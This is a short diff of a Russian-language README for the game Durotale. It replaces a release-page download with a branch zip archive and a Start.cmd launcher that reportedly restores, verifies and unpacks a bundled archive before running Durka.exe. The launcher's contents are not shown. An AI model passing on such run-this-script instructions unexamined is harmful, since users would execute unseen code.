@@ -4,7 +4,7 @@
 
 ## Запуск на Windows x64
 
-Скачайте **Durka-Windows-x64.zip** со [страницы релиза](https://github.com/smaks190-crypto/Durotale/releases/latest). Распакуйте архив целиком в отдельную папку и запустите **Durka.exe**. Файл Durka.pck и каталог data_Durotale_windows_x86_64 должны лежать рядом с ним. В архив входит среда выполнения .NET.
+Скачайте [Windows x64 — готовая сборка](https://github.com/smaks190-crypto/Durotale/archive/refs/heads/windows-x64-demo.zip). Распакуйте весь ZIP. Откройте **Windows** и дважды щёлкните **Start.cmd**. При первом запуске он восстановит и проверит поставляемый архив, распакует игру рядом с собой и запустит **Durka.exe**. Все компоненты входят в загрузку. При следующих запусках можно открывать **Windows/Game/Durka.exe** напрямую. Держите Durka.pck и каталог data_Durotale_windows_x86_64 рядом с программой.
 
 ## Управление
 
